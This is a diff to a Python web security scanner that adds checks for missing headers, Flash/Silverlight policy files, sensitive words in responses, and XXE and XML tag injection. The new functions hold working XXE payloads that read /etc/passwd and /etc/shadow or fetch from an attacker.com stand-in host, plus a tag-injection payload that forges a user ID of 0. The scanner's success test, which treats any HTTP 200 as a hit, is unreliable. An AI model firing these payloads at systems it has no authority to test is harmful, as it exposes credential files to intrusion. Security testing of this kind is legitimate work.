@@ -1,101 +1,120 @@
-import os
-import requests
+import requests 
+from urllib.parse import urljoin
 
-# Function to load headers from a file
+def scan_security_misconfigurations(url):
+
+    results = []
+
+    # Check for missing security headers
+    missing_headers = scan_for_missing_headers(url)
+
+    if missing_headers:
+
+        results.append(f"Missing Headers: {', '.join(missing_headers)}")
+
+    # Scan for RIA policy files
+    ria_vulnerabilities = scan_for_ria_policy_files(url)
+
+    if ria_vulnerabilities:
+
+        results.extend(ria_vulnerabilities)
+
+    # Scan for improper logging
+    improper_logging_issues = scan_for_improper_logging(url)
+
+    if improper_logging_issues:
+
+        results.extend(improper_logging_issues)
+
+    # Scan for XXE injection vulnerabilities
+    xxe_vulnerabilities = scan_for_xxe_injection(url)
+
+    if xxe_vulnerabilities:
+
+        results.extend(xxe_vulnerabilities)
+
+    # Scan for Tag Injection vulnerabilities
+    tag_injection_vulnerabilities = scan_for_tag_injection(url)
+
+    if tag_injection_vulnerabilities:
+
+        results.extend(tag_injection_vulnerabilities)
+
+    return results
+
+def scan_for_missing_headers(url):
+
+    headers_file = 'scanner/headers.txt'
+
+    headers = load_headers(headers_file)
+
+    missing_headers = []
+
+    try:
+        response = requests.get(url)
+
+        response.raise_for_status()
+
+        for header in headers:
+
+            if header not in response.headers:
+
+                missing_headers.append(header)
+
+    except requests.RequestException as reqexception:
+
+        print(f"Error fetching URL {url}: {reqexception}")
+
+    return missing_headers
+
 def load_headers(file_name):
-
-    file_path = os.path.join(os.path.dirname(__file__), file_name)
 
     headers = []
 
     try:
 
-        with open(file_path, 'r') as file:
+        with open(file_name, 'r') as file:
 
             headers = [line.strip() for line in file.readlines()]
 
     except FileNotFoundError:
 
-        print(f"File {file_name} not found in {file_path}")
+        print(f"File {file_name} not found.")
 
     return headers
 
-# List of headers to check
-headers_file = 'headers.txt'
-
-Header_list = load_headers(headers_file)
-
-def scan_security_misconfigurations(url):
-
-    try:
-
-        # Sending an HTTP GET request to the provided URL
-        response = requests.get(url)
-        # Check if the request returned an HTTP error
-        response.raise_for_status()  
-
-    except requests.RequestException as reqexceptions:
-
-        return [f"Error fetching URL {url}: {reqexceptions}"]
-    
-    # Checking for missing headers
-    missing_headers = []
-
-    for header in Header_list:
-
-        if header not in response.headers:
-
-            missing_headers.append(f"{header} header missing")
-
-    # Scan for RIA policy files
-    ria_vulnerabilities = scan_for_ria_policy_files(url)
-
-    # Scan for improper logging
-    improper_logging_issues = scan_for_improper_logging(url)
-
-    return missing_headers + ria_vulnerabilities + improper_logging_issues
-
 def scan_for_ria_policy_files(base_url):
 
-    # List of RIA policy files to check for
     policy_files = ["crossdomain.xml", "clientaccesspolicy.xml"]
 
     vulnerabilities = []
 
-    # Iterate over the policy files and construct the URL
     for policy_file in policy_files:
 
-        policy_url = f"{base_url}/{policy_file}"
+        policy_url = urljoin(base_url, policy_file)
 
         try:
 
-            # Send a GET request to the policy file URL
             response = requests.get(policy_url)
 
-            # If the status is OK
             if response.status_code == 200:
 
-                # Policy file was found
                 vulnerabilities.append(f"Found {policy_file} at {policy_url}")
 
-                # Check if the policy file is overly permissive - Policies with “*” in them should be closely examined
                 if "*" in response.text:
 
                     vulnerabilities.append(f"Overly permissive policy found in {policy_file} at {policy_url}")
 
             else:
 
-                # Policy file was not found
                 vulnerabilities.append(f"{policy_file} not found at {policy_url}")
 
-        # Handling request exceptions
-        except requests.RequestException as reqexceptions:
+        except requests.RequestException as reqexception:
 
-            vulnerabilities.append(f"Error accessing {policy_file} at {policy_url}: {reqexceptions}")
+            vulnerabilities.append(f"Error accessing {policy_file} at {policy_url}: {reqexception}")
 
     return vulnerabilities
 
-# Scanning for improper logging
 def scan_for_improper_logging(url):
 
     logging_issues = []
@@ -106,16 +125,76 @@ def scan_for_improper_logging(url):
 
         response = requests.get(url)
 
-        # Check the response for any sensitive keywords which should not be in the logs
         for word in sensitive_words:
 
             if word in response.text.lower():
 
                 logging_issues.append(f"Sensitive data found in logs: {word}")
 
-    except requests.RequestException as reqexceptions:
+    except requests.RequestException as reqexception:
 
-        logging_issues.append(f"Error while checking for logging issues at {url}: {reqexceptions}")
+        logging_issues.append(f"Error while checking for logging issues at {url}: {reqexception}")
 
     return logging_issues
+
+
+def scan_for_xxe_injection(url):
+
+    xxe_payloads = [
+
+        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>',
+
+        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
+
+        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>',
+
+        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>',
+
+        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>'
+
+    ]
+
+    results = []
+
+    for payload in xxe_payloads:
+
+        try:
+
+            response = requests.post(url, data=payload, headers={"Content-Type": "application/xml"})
+
+            if response.status_code == 200:
+
+                results.append(f"XXE Injection payload triggered: {payload}")
+
+        except requests.RequestException as reqexception:
+
+            results.append(f"Error while testing XXE injection at {url}: {reqexception}")
+
+    return results
+
+def scan_for_tag_injection(url):
+
+    tag_injection_payloads = [
+
+        "<?xml version='1.0' encoding='ISO-8859-1'?><users><user><username>tony</username><password>Un6R34kb!e</password><!--<mail>s4tan@hell.com</mail><userid>0</userid>--><mail>s4tan@hell.com</mail></user></users>"
+
+    ]
+
+    results = []
+
+    for payload in tag_injection_payloads:
+
+        try:
+
+            response = requests.post(url, data=payload, headers={"Content-Type": "application/xml"})
+
+            if response.status_code == 200:
+
+                results.append(f"Tag Injection payload triggered: {payload}")
+
+        except requests.RequestException as reqexception:
+
+            results.append(f"Error while testing Tag Injection at {url}: {reqexception}")
+
+    return results
 
